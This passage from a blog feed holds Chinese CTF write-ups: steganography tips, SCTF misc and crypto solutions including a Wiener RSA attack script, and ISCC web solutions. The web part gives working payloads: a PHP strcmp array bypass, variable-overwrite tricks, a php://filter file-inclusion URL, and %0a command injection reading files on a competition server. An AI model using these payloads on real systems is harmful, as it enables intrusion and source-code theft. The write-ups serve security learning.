text"><br>复制备注到sublime，发现是tab和空格，于是猜测为摩斯码，空格为点，tab为横线<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352479146.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352490146.png" alt="Alt text"><br>解码得到密码，解压后得到图片，用Stegoslove分析应该是LSB隐写，用cloacked-pixel解出flag，密码为弱口令<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532440300026.png" alt="Alt text"><br>flag{jsy09-wytg5-wius8}</p><h3 id="反色二维码"><a href="#反色二维码" class="headerlink" title="反色二维码"></a>反色二维码</h3><p>有些简单题目用stegsolve就能出二维码不过是反色的<br>比如这种</p><blockquote><p>whalectf Find<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401924732.png" alt="Alt text"></p></blockquote><p>这时候发送到QQ上点击选中就可以扫了<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401973178.png" alt="Alt text"></p><h2 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h2><p>第一种是在word内容里隐藏文字<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368015116.png" alt="Alt text"><br>勾选上隐藏文字就可以看到隐写内容。<br>当然也有把文字颜色改为和背景色一样的，还有用图片覆盖的。</p><p>第二种是在xml文件中隐藏<br>用binwalk查看文件或者将文件后缀名改为zip可以解压出xml文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368372808.png" alt="Alt text"></p><p>未完待添加。。。。。。</p><h2 id="上述题目文件链接"><a href="#上述题目文件链接" class="headerlink" title="上述题目文件链接"></a>上述题目文件链接</h2><p>链接：<a href="https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g" target="_blank" rel="external">https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g</a> 密码：7r3s</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;图片隐写&quot;&gt;&lt;a href=&quot;#图片隐写&quot; class=&quot;headerlink&quot; title=&quot;图片隐写&quot;&gt;&lt;/a&gt;图片隐写&lt;/h2&gt;&lt;h3 id=&quot;F5隐写&quot;&gt;&lt;a href=&quot;#F5隐写&quot; class=&quot;headerlink&quot; title=&quot;F5隐写&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://www.twosmi1e.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SCTF writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/15/SCTF-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/15/SCTF-writeup/</id>
    <published>2018-07-14T17:25:28.000Z</published>
    <updated>2018-08-02T17:32:12.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>根据提示用侧信道简单能量分析攻击 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="/2018/07/15/SCTF-writeup/1529508947239.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529510158298.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529508876165.png" alt="Alt text"><br>因为不知道哪个是0哪个是1 然后试了一下</p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="/2018/07/15/SCTF-writeup/1529509226841.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529509154812.png" alt="Alt text"></p><p>按照网上一道类似题的分析，找TCP/IP协议502,102端口<br>追踪TCP流</p><p>SCTF{Easy_Mdbus}</p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>百度找到看雪的一篇分析文章<br>logicdata拖进Logic里面,分析嗅探得到的波形图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x33 0x01 s1</span><br><span class="line">0x33 0x02 s2</span><br><span class="line">0x33 0x03 s3</span><br></pre></td></tr></table></figure></p><p>读出s1, s2, s3</p><p><img src="/2018/07/15/SCTF-writeup/1529509388163.png" alt="Alt text"></p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>用爱奇艺可以拖flash  然后直接拖到最后看了几遍什么都没发现 然后往前翻 发现中间有个过程动画(大概57那里)与那个boss对话中有段base64 解码<br><img src="/2018/07/15/SCTF-writeup/1529509923703.png" alt="Alt text"></p><p><img src="/2018/07/15/SCTF-writeup/1529509417432.png" alt="Alt text"></p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>给出了n, e, c  求m<br>首先尝试了一下分解n,结果太大分解不出来<br><img src="/2018/07/15/SCTF-writeup/1529509597682.png" alt="Alt text"><br>看了一下RSA相关文章 用低解密指数攻击<br><strong>特征：e看起来非常大</strong><br>github 上有RSAwienerHacker 直接下下来跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># TEST functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_hack_RSA</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Testing Wiener Attack"</span>)</span><br><span class="line">    times = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(times&gt;<span class="number">0</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        e,n,d = RSAvulnerableKeyGenerator.generateKeys(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"(e,n) is ("</span>, e, <span class="string">", "</span>, n, <span class="string">")"</span>)</span><br><span class="line">        print(<span class="string">"d = "</span>, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d = hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> d == hacked_d:</span><br><span class="line">            print(<span class="string">"Hack WORKED!"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Hack FAILED"</span>)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">"d = "</span>, d, <span class="string">", hacked_d = "</span>, hacked_d)</span><br><span class="line">        print(<span class="string">"-------------------------"</span>)</span><br><span class="line">        times -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#test_is_perfect_square()</span></span><br><span class="line">    <span class="comment">#print("-------------------------")</span></span><br><span class="line">    test_hack_RSA()</span><br><span class="line"></span><br><span class="line">n = <span class="number">356096033429997161372356441930246707554046995590506452306084931488519008238592151695866774341246347160182054216879883209187019942641996111166252052256475412435016177136773967956292472785118669272929844214105480922945372638910276569650465033695573697459823872295312452877368652943145314840314022954151337366463</span></span><br><span class="line">e = <span class="number">160222447153262895889250928158012827757109871196102040037421857250766491575699886894325697077956068896677359953037375582060511979328323570880578946073240834317364119936983046746942944368567355131867682895196198904859001202051459879133425754080440276218324680838480108302184726980362910704693149535052743526713</span></span><br><span class="line">c = <span class="number">147196512678165362278479859274730376684762864061315836792770099383278172248558388764516679102190414689292831454764081139184450400390951627813402530351267384900672105846731222258018693047922255488857215383862135296386187138430843389538652580147662346075434257219061071710799682137566072656776621262987516040147</span></span><br><span class="line">d = hack_RSA(e, n)</span><br><span class="line">print(d)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(<span class="string">'%#x'</span>%m)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/07/15/SCTF-writeup/1529509732002.png" alt="Alt text"><br>提交十进制十六进制都不对，转一下十六进制<br><img src="/2018/07/15/SCTF-writeup/1529509833971.png" alt="Alt text"><br>get flag</p><blockquote><p>贴个官方WP</p></blockquote><p><a href="https://www.xctf.org.cn//media/infoattach/38405dd3f67e4d3e93c5d5042ff14909.pdf" target="_blank" rel="external">SCTF官方WP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h2&gt;&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ISCC writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/01/ISCC-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/01/ISCC-writeup/</id>
    <published>2018-07-01T09:45:32.000Z</published>
    <updated>2018-08-02T17:26:16.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC-WP"><a href="#ISCC-WP" class="headerlink" title="ISCC WP"></a>ISCC WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>图片隐写给了一张这个图<br><img src="/2018/07/01/ISCC-writeup/1525678030342.png" alt="Alt text"></p><p>然后看手指指的地方应该就是flag  改高度<br><img src="/2018/07/01/ISCC-writeup/1525678281836.png" alt="Alt text"></p><p>IHDR后的前八个字节为宽度（第二排00 00 02 72），接下来八个为高度，将高度改为和宽度一样得到flag<br><img src="/2018/07/01/ISCC-writeup/WhatIsThat1.png" alt="Alt text"></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>给了一个txt内容是：<br>秘密电报：<br>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA<br>刚开始以为是摩斯密码结果没有分割符，直接复制百度，是培根密码然后在线解密得到flag</p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。<br>一看题目肯定有凯撒密码，移位13得到roqtp697t95j3，然后是学会使用键盘，应该是键盘加密，刚开始以为是围成什么图案或者是围起来的字母，后面发现按键盘往下移一排就是flag<br>得到flag:yougotme</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>前端代码控制的直接浏览器改一下<strong>maxlength</strong>就好了，客户端的限制一般都很好过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">maxlength</span>=<span class="string">"3"</span> <span class="attr">name</span>=<span class="string">"v"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$flag=<span class="string">'&#123;***************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP的strcmp漏洞，另一篇博客里面有，传个数组就可以get flag<br><img src="/2018/07/01/ISCC-writeup/1525692789515.png" alt="Alt text"></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><img src="/2018/07/01/ISCC-writeup/1525692860618.png" alt="Alt text"><br>burp抓包改一下XFW或者HOST就可以了</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><img src="/2018/07/01/ISCC-writeup/1525693740896.png" alt="Alt text"><br>callback的后面有一串url和base64的编码，把base64那部分解码出来<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA</span><br><span class="line"> &lt;script&gt;alert(<span class="string">"key:/%nsfocusXSStest%/"</span>)&lt;<span class="regexp">/scrip</span></span><br></pre></td></tr></table></figure></p><p>中间的key部分就是答案，我还一直在那里测xss测了半天，没想到这么坑，而且提交的时候只用key冒号后面的内容<br><img src="/2018/07/01/ISCC-writeup/1525693998162.png" alt="Alt text"></p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>Tip：好像有个文件忘记删了<br>可以想到是后台文件没删或者源码泄露，扫了下后台，试了下svn都没收获。然后py了一下原来是没删txt文件，直接输入<a href="http://118.190.152.202:8009/index.php.txt就可以读源码了" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt就可以读源码了</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>()是数组的迭代方法</span><br><span class="line"><span class="keyword">foreach</span>(array_expression <span class="keyword">as</span> $key =&gt; $value)每次循环中键值也会赋给$key</span><br></pre></td></tr></table></figure><p>分析源码，$flag应该是flag.php中的变量就是所找的答案，而最后的一个if语句执行判断，POSTflag后echo出flag，可以通过foreach的变量覆盖绕过，而要得到flag就需要从另一个输出点输出原本的flag变量。</p><p>为了方便理解我们在本地修改源码将变量值打印出来</p><p>payload1：<br><img src="/2018/07/01/ISCC-writeup/1525847512296.png" alt="Alt text"><br>可以看出第一个foreach里将<strong>\$flag</strong>的值赋给了<strong>\$_200</strong>，第二个foreach将上传的flag值赋给<strong>\$flag</strong>，从而通过后面的if判断，然后<strong>die(\$_200)</strong>输出flag内容。<br>payload2:<br><img src="/2018/07/01/ISCC-writeup/1525849178524.png" alt="Alt text"><br>第二种将<strong>\$flag</strong>的值赋给了<strong>\$_403</strong>，同时给<strong>\$_POST</strong>赋一个值使if判断成立输出<strong>\$_403</strong>，如果只给403赋值的话效果如下<br><img src="/2018/07/01/ISCC-writeup/1525849330422.png" alt="Alt text"></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><img src="/2018/07/01/ISCC-writeup/1525694416084.png" alt="Alt text"><br>刚开始看到ID以为是SQL注入，看到<strong>f=articles</strong>才反应过来读取本地文件应该是文件包含吧（之后应该找个时间总结一下文件包含和php伪协议，挖坑ing）<br>然后用php://协议<br>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</span><br><span class="line"># payload</span><br><span class="line">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=1</span><br></pre></td></tr></table></figure></p><p><img src="/2018/07/01/ISCC-writeup/1525694700020.png" alt="Alt text"><br>然后base64解码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html lang=&quot;en&quot;&gt; </span><br><span class="line">&lt;head&gt;</span><br><span class="line">     &lt;title&gt;?????????&lt;/title&gt;</span><br><span class="line">          &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">     &lt;a href=&apos;index.php?f=articles&amp;id=1&apos;&gt;ID: 1&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=2&apos;&gt;ID: 2&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=3&apos;&gt;ID: 3&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=4&apos;&gt;ID: 4&lt;/href&gt;     &lt;/br&gt; &lt;/body&gt; &lt;/html&gt;  </span><br><span class="line"></span><br><span class="line">&lt;?php     #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;     </span><br><span class="line">if(isset($_GET[&apos;f&apos;]))&#123;         </span><br><span class="line">if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</span><br><span class="line">             die(&quot;error...&quot;);</span><br><span class="line">&#125;         </span><br><span class="line">else&#123;             </span><br><span class="line">include($_GET[&apos;f&apos;] . &apos;.php&apos;);</span><br><span class="line">&#125;     </span><br><span class="line">&#125;      </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="/2018/07/01/ISCC-writeup/1525694803250.png" alt="Alt text"><br>跟前面的一道比较类似吧，不过这道加<strong>X-Forward-For</strong>似乎没有用，加了<strong>client-ip</strong>后得到flag<br><img src="/2018/07/01/ISCC-writeup/1525694876173.png" alt="Alt text"></p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>按提示随便传个用户名和密码<br><img src="/2018/07/01/ISCC-writeup/1525695240838.png" alt="Alt text"><br>然后看注释又是index.php.txt,然后读源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"***********"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</span><br><span class="line">$b = g;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>分析一下，username还是用的strcmp判断的，然后password要求长度&lt;4且数值&gt;999，所以payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8017/?username[]=&apos;admin&apos;&amp;password=9e9</span><br></pre></td></tr></table></figure></p><p><img src="/2018/07/01/ISCC-writeup/1525696215252.png" alt="Alt text"></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>开始完全不知道该怎么做，还是太菜了呀，py过后</p><p>在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> &apos;&apos;,</span><br><span class="line">&apos;;&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;|&apos; =&gt; &apos;&apos;,</span><br><span class="line">&apos;-&apos;  =&gt; &apos;&apos;,</span><br><span class="line">&apos;$&apos;  =&gt; &apos;&apos;,</span><br><span class="line">&apos;(&apos;  =&gt; &apos;&apos;,</span><br><span class="line">&apos;)&apos;  =&gt; 